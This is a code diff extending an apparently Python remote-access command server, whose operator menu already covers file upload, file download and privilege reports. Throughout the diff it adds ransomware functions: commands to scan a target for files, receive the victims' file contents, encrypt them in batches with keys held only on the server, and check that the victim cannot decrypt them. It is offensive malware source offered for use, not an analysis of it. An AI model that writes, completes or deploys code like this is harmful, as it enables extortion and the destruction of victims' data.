@@ -8,6 +8,11 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
 
+from features.ransomware_server import create_ransomware_server
+
+# Global ransomware server instance
+ransomware_server = None
+
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
@@ -94,6 +99,14 @@ def target_communication():
     print("FILE OPERATIONS:")
     print("   upload <filename>      - Upload file to target")
     print("   download <filename>    - Download file from target")
+    print("")
+    print("RANSOMWARE COMMANDS:")
+    print("   ransomware_init        - Initialize ransomware client")
+    print("   ransomware_scan        - Scan for target files")
+    print("   ransomware_encrypt <n> - Encrypt n files (server-side encryption)")
+    print("   ransomware_status      - Get ransomware status")
+    print("   ransomware_decrypt_attempt - Test client decryption block")
+    print("   ransomware_server_stats - Show server encryption stats")
     print("")
     print(f"Connected to target: {ip[0]}:{ip[1]}")
     
@@ -182,6 +195,78 @@ def target_communication():
                 print(f"Privilege Report:\n{'-'*40}")
                 print(result)
                 print("-"*40)
+        elif command in ['ransomware_init', 'ransomware_scan', 'ransomware_status', 'ransomware_decrypt_attempt']:
+            # Handle basic ransomware commands
+            result = reliable_recv()
+            if command == 'ransomware_init':
+                print(f"Ransomware Init:\n{'-'*40}")
+                print(result)
+                print("-"*40)
+            elif command == 'ransomware_scan':
+                print(f"File Scan: {result}")
+            elif command == 'ransomware_status':
+                print(f"Ransomware Status:\n{'-'*40}")
+                print(result)
+                print("-"*40)
+            elif command == 'ransomware_decrypt_attempt':
+                print(f"Decryption Attempt (Should Be Blocked):\n{'-'*40}")
+                print(result)
+                print("-"*40)
+        elif command.startswith('ransomware_encrypt '):
+            # Handle file encryption request from client
+            result = reliable_recv()
+            try:
+                # Parse the prepared files data from client
+                encryption_request = json.loads(result)
+                
+                if encryption_request.get('action') == 'encrypt_batch':
+                    global ransomware_server
+                    if ransomware_server is None:
+                        ransomware_server = create_ransomware_server()
+                    
+                    # Process each file for encryption
+                    prepared_files = encryption_request.get('prepared_files', [])
+                    session_id = encryption_request.get('session_id', 'unknown')
+                    
+                    print(f"Processing {len(prepared_files)} files for encryption...")
+                    
+                    # Prepare files for server encryption
+                    files_data = []
+                    for file_item in prepared_files:
+                        file_data = bytes.fromhex(file_item['file_data_hex'])
+                        files_data.append({
+                            'file_data': file_data,
+                            'file_info': file_item['file_info']
+                        })
+                    
+                    # Encrypt files using server
+                    encryption_results = ransomware_server.encrypt_files_batch(files_data, session_id)
+                    
+                    print(f"Server Encryption Results:\n{'-'*40}")
+                    for i, result in enumerate(encryption_results):
+                        if result['success']:
+                            print(f"File {i+1}: {result['original_path']} -> {result['file_id']}")
+                        else:
+                            print(f"File {i+1}: {result['original_path']} -> {result['error']}")
+                    print("-"*40)
+                    
+                    # Send results back to client (in real implementation)
+                    # For now, just show server-side success
+                    successful = sum(1 for r in encryption_results if r['success'])
+                    print(f"Encrypted {successful}/{len(encryption_results)} files successfully")
+                
+            except Exception as e:
+                print(f"Encryption processing error: {e}")
+        elif command == 'ransomware_server_stats':
+            # Handle server-side ransomware stats locally
+            global ransomware_server
+            if ransomware_server is None:
+                ransomware_server = create_ransomware_server()
+            
+            stats = ransomware_server.get_server_statistics()
+            print(f"Server Ransomware Stats:\n{'-'*40}")
+            print(json.dumps(stats, indent=2))
+            print("-"*40)
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
@@ -206,6 +291,10 @@ sock.listen(5)
 # Accept incoming connection from the target and obtain the target's IP address.
 target, ip = sock.accept()
 print('[+] Target Connected From: ' + str(ip))
+
+# Initialize ransomware server
+ransomware_server = create_ransomware_server()
+print('[+] Ransomware Server Initialized - All encryption keys secured server-side')
 
 # Start the main communication loop with the target by calling target_communication.
 target_communication()
